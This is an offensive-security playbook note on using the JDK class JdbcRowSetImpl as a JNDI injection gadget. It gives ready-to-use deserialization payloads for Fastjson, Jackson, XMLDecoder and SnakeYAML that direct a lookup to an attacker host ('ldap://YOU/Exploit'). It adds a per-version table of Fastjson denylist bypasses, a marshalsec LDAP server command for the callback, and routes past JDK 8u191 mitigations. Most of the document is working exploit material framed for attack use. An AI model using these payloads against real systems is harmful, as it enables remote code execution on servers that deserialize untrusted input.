# JdbcRowSetImpl — the JDK-only JNDI gadget

## Why it matters

`com.sun.rowset.JdbcRowSetImpl` is a JDK class — no external library needed.
Setting its `dataSourceName` then triggering `getConnection`/`setAutoCommit`
calls `InitialContext.lookup(theName)` — JNDI injection on stock Java.

## The mechanism

```java
// the internals (simplified):
rowSet.setDataSourceName("ldap://YOU/Exploit");   // prop — YOU set it
rowSet.setAutoCommit(true);                        // trigger → connect()
   → connect() → new InitialContext().lookup(dataSourceName) → JNDI
```

The `autoCommit` setter calls `connect()` — which does the `lookup` with
the `dataSourceName` you control. The two props are the URL and the trigger.

## The delivery vectors — how the object gets its props set

### Fastjson `@type` auto-type — the classic

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://YOU/Exploit",
 "autoCommit":true}
```

Fastjson's `autoType` instantiates the class then calls setters — the
`autoCommit` setter triggers `connect`→`lookup`. `dataSourceName` is yours.

### Jackson default-typing

```json
["com.sun.rowset.JdbcRowSetImpl",
 {"dataSourceName":"ldap://YOU/Exploit","autoCommit":true}]
```

Same mechanism — polymorphic-typing deserialization sets the props.

### Java serialization — the object inside a chain

A `readObject` path that instantiates `JdbcRowSetImpl` with the props set —
a gadget chain whose trampoline sets `dataSourceName` and `autoCommit`.

### XMLDecoder — the bean path

```xml
<java><object class="com.sun.rowset.JdbcRowSetImpl">
  <void property="dataSourceName"><string>ldap://YOU/Exploit</string></void>
  <void property="autoCommit"><boolean>true</boolean></void>
</object></java>
```

`XMLDecoder` calls property setters — `autoCommit` fires `connect`.

### Snakeyaml

```yaml
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://YOU/Exploit"
  autoCommit: true
```

## The JDK mitigation interaction

`lookup(ldap://)` remote classload is dead on JDK ≥8u191 — BUT the `lookup`
ITSELF still runs → the LDAP/RMI connect-out callback confirms the sink.
Then the 8u191+ bypass routes (see `jndi-injection.md`):

- `javaSerializedData` — the LDAP entry IS a serialized object
- Tomcat `BeanFactory`+`ELProcessor` local-factory route
- a local `ObjectFactory` on the classpath

## The fastjson autoType version maze

`JdbcRowSetImpl` is on fastjson's denylist from 1.2.25 — bypasses per
version:

```
1.2.24-1.2.47  → straight @type
1.2.25-1.2.41  → Lcom.sun.rowset.JdbcRowSetImpl;  (L...; wrapper)
1.2.42         → LLcom.sun.rowset.JdbcRowSetImpl;;  (double-L)
1.2.43         → [com.sun.rowset.JdbcRowSetImpl     ([ prefix)
1.2.44-47      → TypeUtils.loadClass cache poison
1.2.48+        → checkException stricter — a different gadget
```

Version matters — a wrong-version payload silently does nothing. Read the
jar version first.

## The `lookup` confirm — without RCE

```bash
# stand a listener:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://YOU:8000/#Exploit 1389
# OR just watch the connect:
python3 -c "from http.server import *; ..."   # any listener logs the hit
```

A `ldap://YOU/` connect-attempt in the listener log = the `lookup` ran =
the `dataSourceName`+`autoCommit` props were honored = the deserializer
instantiated the class. That's the class-confirm even when remote
codebase is dead.

## The trigger details — what actually calls `connect`

```java
// in JdbcRowSetImpl:
setAutoCommit(boolean) → connect() → lookup()
getConnection()         → connect() → lookup()
prepare()/execute()     → connect() → lookup()
```

`autoCommit` is the standard trigger because it's a setter the deserializer
calls *during* prop-set — you don't need a later method call.

## Falsifiers

- The class isn't reachable — `com.sun.rowset` is JDK-internal; a module-
  locked JDK 11+ may restrict it → try `BasicRowSetImpl` or another JDK
  rowset variant
- fastjson `autoType` off AND no `expectClass`/`checkAutoType` gap
- no lookup-trigger setter reachable — `dataSourceName` set but no
  `autoCommit`/`getConnection` called → the connect never runs
- JDK ≥8u191 AND no local-factory/serialized-data path → JNDI callback is
  the only win (class-confirm, no RCE)

## Output to record

- The delivery vector (fastjson/jackson/xstream/xmldecoder/snakeyaml/ser)
- The `dataSourceName` + `autoCommit` the payload carried
- The listener log proving `lookup` ran (or the RCE output)
